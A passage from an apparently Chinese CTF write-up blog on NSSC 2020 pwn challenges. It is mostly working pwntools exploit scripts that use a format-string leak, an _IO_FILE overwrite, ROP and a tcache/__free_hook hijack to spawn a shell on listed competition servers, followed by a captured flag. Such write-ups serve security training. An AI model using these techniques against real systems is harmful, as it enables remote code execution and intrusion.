<span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;119.3.89.93&quot;</span></span><br><span class="line">server_port = <span class="number">8014</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">i, sz, d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;ce:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(sz))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">i, sz, d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;ce:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(sz))</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">len</span>(d) &gt; <span class="number">0</span>):</span><br><span class="line">		sa(<span class="string">&#x27;:&#x27;</span>, d)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">i</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;ce:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>(<span class="params">i</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;ce:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cre7</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;ce:&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">d</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;ce:&#x27;</span>, <span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">		ad(i, <span class="number">0x18</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	md(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	dp(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	ru(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">-6</span>:] + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">	heap = leak - <span class="number">0x2a0</span></span><br><span class="line">	li(<span class="string">&#x27;heap: &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">		rm(i + <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	md(<span class="number">7</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	md(<span class="number">7</span>, <span class="number">0x18</span>, p64(heap + <span class="number">0x250</span>))</span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	gift(<span class="string">&#x27;none&#x27;</span>)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">	offset = ( <span class="number">0x7f50cd676140</span> - <span class="number">0x7f50cd412000</span> ) <span class="comment"># remote</span></span><br><span class="line">	<span class="comment">#offset = ( 0x7f6faf78a900 - 0x7f6faf53a000) # local</span></span><br><span class="line">	libc_base = leak - offset</span><br><span class="line">	free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0</span>, <span class="number">0x58</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	ad(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">	ad(<span class="number">2</span>, <span class="number">0x58</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">	md(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	md(<span class="number">0</span>, <span class="number">0x58</span>, p64(free_hook))</span><br><span class="line">	gift(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">	gift(p64(system))</span><br><span class="line">	db()</span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	<span class="comment">#ad(5, 0x58, &#x27;A&#x27;)</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/11/08/wp-other/" data-id="ckhemv836003kwdcm1l4733rg" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wp-nssc-2020" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/06/wp-nssc-2020/" class="article-date">
  <time datetime="2020-11-06T13:46:12.000Z" itemprop="datePublished">2020-11-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/06/wp-nssc-2020/">wp-nssc-2020</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="NSSC-2020-CTF-WP"><a href="#NSSC-2020-CTF-WP" class="headerlink" title="NSSC 2020 CTF WP"></a>NSSC 2020 CTF WP</h1><h3 id="2020年全国电信和互联网行业网络安全管理职业技能竞赛（第九届）"><a href="#2020年全国电信和互联网行业网络安全管理职业技能竞赛（第九届）" class="headerlink" title="2020年全国电信和互联网行业网络安全管理职业技能竞赛（第九届）"></a>2020年全国电信和互联网行业网络安全管理职业技能竞赛（第九届）</h3><p>这次比赛表现得不是很好，题目不是很难，也怪自己没把握住时间，第三道比赛刚结束就打通了。。。这次名次为10，应该进线下了，下次好好加油！</p>
<p>本次比赛排名如下:</p>
<p><img src="/images/wp-nssc-2020-01.png" alt="img"></p>
<h1 id="pwn1-Echo"><a href="#pwn1-Echo" class="headerlink" title="pwn1[Echo]"></a>pwn1[Echo]</h1><p>通过利用字符串漏洞泄漏libc基地址, elf基地址, 修改 _IO_FILE struct,然后打入stack 中的 &amp;main ret构造rop链</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: i0gan</span></span><br><span class="line"><span class="comment"># Env: Linux arch 5.8.14-arch1-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li  = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;Echo&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.23&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;121.36.216.253&quot;</span></span><br><span class="line">server_port = <span class="number">10001</span></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	<span class="comment">#leak elf</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">	sl(<span class="string">&#x27;%20$p&#x27;</span>)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	elf_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - (<span class="number">0x562a00b85150</span>-  <span class="number">0x562a00b84000</span>  )</span><br><span class="line">	li(<span class="string">&#x27;elf_base: &#x27;</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line">	pop_rdi = elf_base + <span class="number">0x11b3</span></span><br><span class="line">	</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">	sl(<span class="string">&#x27;%21$p&#x27;</span>)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">240</span></span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	sh_addr  = libc_base + <span class="number">0x18ce17</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">	sl(<span class="string">&#x27;%23$p&#x27;</span>)</span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	stack_ret = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0xe0</span></span><br><span class="line">	li(<span class="string">&#x27;stack_ret: &#x27;</span> + <span class="built_in">hex</span>(stack_ret))</span><br><span class="line">	_IO_2_1_stdin_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">	_IO_buf_base = _IO_2_1_stdin_ + <span class="number">0x8</span> * <span class="number">7</span></span><br><span class="line">	li(<span class="string">&#x27;_IO_buf_base: &#x27;</span> + <span class="built_in">hex</span>(_IO_buf_base))</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p = p64(_IO_buf_base)</span><br><span class="line">	sl(p)</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line">	<span class="comment">#sl(&#x27;%16$p&#x27;)</span></span><br><span class="line">	s(<span class="string">&#x27;%16$hhn&#x27;</span>)</span><br><span class="line">	p = p64(_IO_2_1_stdin_ + <span class="number">0x83</span>) * <span class="number">3</span></span><br><span class="line">	p += p64(stack_ret) + p64(stack_ret + <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, p) <span class="comment">#length:</span></span><br><span class="line">	sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p) - <span class="number">1</span>):</span><br><span class="line">		sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">		sla(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">		sl(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p = p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, p) <span class="comment">#length:</span></span><br><span class="line">	sl(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env= &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br></pre></td></tr></table></figure>

<p>flag{0HOk4cUYpmi6tVAjQSR5zdZRHPSnpeeW}</p>
<h1 id="pwn2-noteplus"><a href="#pwn2-noteplus" class="headerlink" title="pwn2 [noteplus]"></a>pwn2 [noteplus]</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 &lt;= <span class="number">0xF</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span> ( p_addr[v6] )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">std</span>::__ostream_insert&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Content: &quot;</span>, <span class="number">9L</span>L);</span><br><span class="line">     addr = p_addr[v0];</span><br><span class="line">     size = p_size[v0];</span><br><span class="line">     <span class="keyword">if</span> ( size != <span class="number">8</span> )</span><br><span class="line">     &#123;</span><br><span class="line">       buf = (_BYTE *)(addr + <span class="number">8</span>);</span><br><span class="line">       v4 = (_BYTE *)(size + addr);</span><br><span class="line">       <span class="keyword">do</span></span><br><span class="line">       &#123;</span><br><span class="line">         read(<span class="number">0</span>, buf, <span class="number">1u</span>LL);</span><br><span class="line">         <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">         ++buf; <span class="comment">//vul</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">while</span> ( v4 != buf );</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>若开辟大小为0, 则可造成堆溢出, 修改tcahe bin fd，实现任意地址开辟，修改free_hook为system</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: i0gan</span></span><br><span class="line"><span class="comment"># Env: Linux arch 5.8.14-arch1-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span 